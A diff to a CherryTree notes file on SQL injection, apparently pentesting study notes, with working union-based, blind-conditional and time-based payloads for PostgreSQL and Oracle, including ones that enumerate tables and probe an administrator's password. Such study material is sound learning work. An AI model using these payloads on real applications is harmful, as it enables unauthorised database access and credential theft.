@@ -1,12 +1,145 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
-  <node unique_id="3" master_id="0" name="Sqli" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1712679998" ts_lastsave="1712686781">
-    <rich_text scale="h1">Everything SQLi 
-</rich_text>
+  <node unique_id="3" master_id="0" name="Sqli" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1712679998" ts_lastsave="1712687433">
     <rich_text>
-SQLI INjection
+</rich_text>
+    <rich_text style="italic" scale="h1" foreground="#8ff0a4" weight="heavy">SQL Injection (SQLi) Notes</rich_text>
+    <rich_text>
 
-BE ready for whatver comes your way
+</rich_text>
+    <rich_text scale="h2" foreground="#ff7800">Introduction to SQL Injection</rich_text>
+    <rich_text>
+SQL Injection (SQLi) is a code injection technique used to manipulate or exploit SQL queries by inserting malicious SQL statements. This can lead to unauthorized access to database information, modification of data, and other security breaches.
+
+</rich_text>
+    <rich_text scale="h2" foreground="#ff7800">Key Concepts and Commands</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">Union-Based SQL Injection</rich_text>
+    <rich_text>
+• </rich_text>
+    <rich_text weight="heavy">Purpose</rich_text>
+    <rich_text>: Used to combine the results from two SELECT queries into a single result set.
+• </rich_text>
+    <rich_text weight="heavy">Syntax</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">' UNION SELECT column1, column2 FROM table1 WHERE condition1='value' --+</rich_text>
+    <rich_text>
+• </rich_text>
+    <rich_text weight="heavy">Example</rich_text>
+    <rich_text>: Retrieving information from different tables or columns by leveraging the UNION operator.
+
+
+</rich_text>
+    <rich_text scale="h2" foreground="#ff7800">PostgreSQL Specific Commands</rich_text>
+    <rich_text>
+◇ </rich_text>
+    <rich_text weight="heavy">Retrieve Database Version</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">' UNION SELECT version(), NULL--+</rich_text>
+    <rich_text>▪ Retrieves the current version of the PostgreSQL database.
+
+
+◇ </rich_text>
+    <rich_text weight="heavy">List All Table Names</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">' UNION SELECT table_name, 'null' FROM information_schema.tables--+</rich_text>
+    <rich_text>▪ Enumerates all table names in the current database schema.
+
+
+◇ </rich_text>
+    <rich_text weight="heavy">List All Column Names</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">' UNION SELECT column_name, 'null' FROM information_schema.columns WHERE table_name = 'table_name'--+</rich_text>
+    <rich_text>▪ Enumerates all column names for a specific table in the database.
+
+
+
+
+</rich_text>
+    <rich_text scale="h3">Blind SQL Injection</rich_text>
+    <rich_text>
+◇ </rich_text>
+    <rich_text weight="heavy">Purpose</rich_text>
+    <rich_text>: Used when the database does not return data to the user or when the results are not visible.
+◇ </rich_text>
+    <rich_text weight="heavy">Example</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='a'--</rich_text>
+    <rich_text>▪ This command checks if the length of the administrator's password is greater than 3.
+
+
+
+
+</rich_text>
+    <rich_text scale="h2" foreground="#ff7800">Oracle Specific Commands</rich_text>
+    <rich_text>
+◇ </rich_text>
+    <rich_text weight="heavy">List Tables and Columns</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">' UNION SELECT table_name, column_name FROM all_tables--+</rich_text>
+    <rich_text>▪ Lists all tables and their respective columns in an Oracle database.
+
+
+◇ </rich_text>
+    <rich_text weight="heavy">Blind SQLi Example</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">TrackingId=xyz'||(SELECT '' FROM dual)||'</rich_text>
+    <rich_text>▪ This is a test to confirm SQL injection by attempting to execute a benign subquery.
+
+
+
+
+</rich_text>
+    <rich_text scale="h3">Blind SQL Conditional Responses</rich_text>
+    <rich_text>
+◇ </rich_text>
+    <rich_text weight="heavy">Purpose</rich_text>
+    <rich_text>: To deduce information from the database based on the application's response to crafted SQL queries.
+◇ </rich_text>
+    <rich_text weight="heavy">Examples</rich_text>
+    <rich_text>:▪ Test for a valid condition: </rich_text>
+    <rich_text family="monospace">TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</rich_text>
+    <rich_text>
+▪ Determine the length of a password: </rich_text>
+    <rich_text family="monospace">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='a</rich_text>
+    <rich_text>
+
+
+
+
+</rich_text>
+    <rich_text scale="h2" foreground="#ff7800">Methodology for SQL Injection</rich_text>
+    <rich_text>
+1. </rich_text>
+    <rich_text weight="heavy">Identify the Injection Point</rich_text>
+    <rich_text>: Determine where in the application's input fields the SQL injection can occur.
+2. </rich_text>
+    <rich_text weight="heavy">Construct the Injection Query</rich_text>
+    <rich_text>: Start with a simple string and progressively build more complex queries.
+3. </rich_text>
+    <rich_text weight="heavy">Test the Query</rich_text>
+    <rich_text>: Verify that the constructed SQL query executes and manipulates the database output or behavior.
+
+</rich_text>
+    <rich_text scale="h3">Time-Based SQL Injection</rich_text>
+    <rich_text>
+◇ </rich_text>
+    <rich_text weight="heavy">Purpose</rich_text>
+    <rich_text>: A technique where the response time of the query is used to infer database information.
+◇ </rich_text>
+    <rich_text weight="heavy">Example</rich_text>
+    <rich_text>: </rich_text>
+    <rich_text family="monospace">'|| (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) --+</rich_text>
+    <rich_text>▪ This query causes the database to delay the response, which can indicate a successful injection.
+
+
+
+By understanding and utilizing these commands and concepts, individuals can identify and prevent SQL injection vulnerabilities in applications, enhancing their security posture.
+
+
+
 </rich_text>
   </node>
 </cherrytree>
